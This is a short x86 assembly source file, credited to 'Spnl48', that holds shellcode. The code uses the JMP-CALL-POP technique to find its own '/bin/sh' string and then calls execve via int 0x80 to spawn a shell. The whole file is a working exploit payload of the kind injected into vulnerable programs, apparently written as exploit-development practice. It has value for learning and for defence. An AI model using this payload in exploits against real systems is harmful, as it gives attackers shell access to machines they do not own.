; Filename: mylow.nasm
; Author: Spnl48
; Description: A shellcode to execute a program using execve with the JMP-CALL-POP technique

global _start

Section .text


_start:
  jmp short callme
  shellcode:
	pop    esi  
	xor eax, eax
	mov byte [esi + 7], al ; J=0

	lea ebx, [esi] ; /bin/sh0AAAAKKKK into EBX	
	mov long [esi + 8], ebx ; /bin/sh0AAAA
	mov long [esi + 12], eax; /bin/sh0AAAA0000
	mov byte al, 0x0b; syscall value 11 in al (8  Bit)
	
	mov ebx, esi; load EBX with the value /bin/sh0AAAA0000
	lea ecx, [esi + 8]; load AAAA into ECX
	lea edx, [esi + 12]; load KKKK a pointer Null into edx
	int 0x80; execute the syscall


callme:
 call shellcode
 db '/bin/shJAAAAKKKK'

